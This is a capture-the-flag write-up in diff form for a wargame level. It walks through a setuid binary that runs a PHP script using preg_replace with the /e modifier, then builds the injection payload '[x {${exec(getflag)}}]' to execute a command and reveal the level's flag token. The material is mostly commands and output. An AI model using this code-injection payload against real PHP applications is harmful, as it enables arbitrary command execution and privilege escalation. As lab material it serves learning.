@@ -1,0 +1,76 @@
+$ ls -l 
+ => -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+ => -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+
+$ strings level06
+we see execve and the strings /usr/bin/php /home/user/level06/level06.php
+
+$ cat level06.php
+
+<?php
+function y($m) 
+{ 
+	$m = preg_replace("/\./", " x ", $m); 
+	$m = preg_replace("/@/", " y", $m); 
+	return $m; 
+}
+
+function x($y, $z) 
+{ 
+	$a = file_get_contents($y); 
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+	$a = preg_replace("/\[/", "(", $a); 
+	$a = preg_replace("/\]/", ")", $a); 
+	return $a; 
+}
+$r = x($argv[1], $argv[2]); print $r;
+
+?>
+
+the function x is executed read content of a file then perform REGEX on its content and print the result
+
+however this line $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+the 'e' in the first argument  allow us to execute php code with eval()
+we have to match REGEX [x (*)] transformed to y(*)
+
+i worked with this php code to tinker it until i get the result i wanted
+
+$ cat test.php
+<?php
+	$a = "[x exec(getflag)]"
+	$a = preg_replace("/(\[x (.*)\])/", "y(\"\\2\")", $a); 
+	print $a;
+	eval($a)
+?>
+
+removing the e on the regex allow to see the result without execution
+and then eval execute it
+
+
+$ php /tmp/test.php
+ => y("exec(getflag)")PHP Parse error:  syntax error, unexpected $end in /tmp/ok.php(5) : eval()'d code on line 1
+
+script did : eval(y("exec(getflag)"))
+
+if we change $a to : [x {${exec(getflag)}}]
+it will replace y() content by the result of exec(getflag)
+
+php /tmp/test.php
+ => PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /tmp/ok.php on line 2
+ => PHP Notice:  Undefined variable: Nope there is no token here for you sorry. Try again :) in /tmp/ok.php on line 2
+ => y("")PHP Parse error:  syntax error, unexpected $end in /tmp/ok.php(5) : eval()'d code on line 1
+
+we have getflag executed and it's output printed
+
+so we do : 
+ echo '[x {${exec(getflag)}}]' > /tmp/regex
+ ./level06 /tmp/regex
+ => PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+ => PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+
+we have the flag : wiok45aaoguiboiki2tuin6ub
+
+ su level7
+ password : wiok45aaoguiboiki2tuin6ub
+
